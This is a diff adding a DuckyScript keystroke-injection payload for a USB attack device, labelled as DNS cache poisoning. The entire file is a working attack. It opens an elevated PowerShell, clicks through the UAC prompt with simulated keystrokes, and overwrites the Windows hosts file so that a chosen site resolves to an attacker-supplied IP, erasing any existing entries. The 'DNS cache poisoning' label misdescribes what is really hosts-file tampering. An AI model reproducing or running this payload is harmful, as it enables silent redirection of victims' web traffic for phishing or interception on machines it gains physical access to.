@@ -1,0 +1,19 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Poisons the DNS Cache. (https://www.cloudflare.com/learning/dns/dns-cache-poisoning/)
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 750
+WINDOWS r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 870
+ALT y
+DELAY 790
+STRING $redirectionAddress="IP ADRESS HERE";$redirectedSite="URL HERE";$hosts1 = $redirectionAddress + ' ' + $redirectedSite + ([Environment]::NewLine);$hosts2 = $redirectionAddress + ' www.' + $redirectedSite;$hoststotal = $hosts1 + $hosts2;[io.file]::writealltext("C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS", $hoststotal); exit
+ENTER
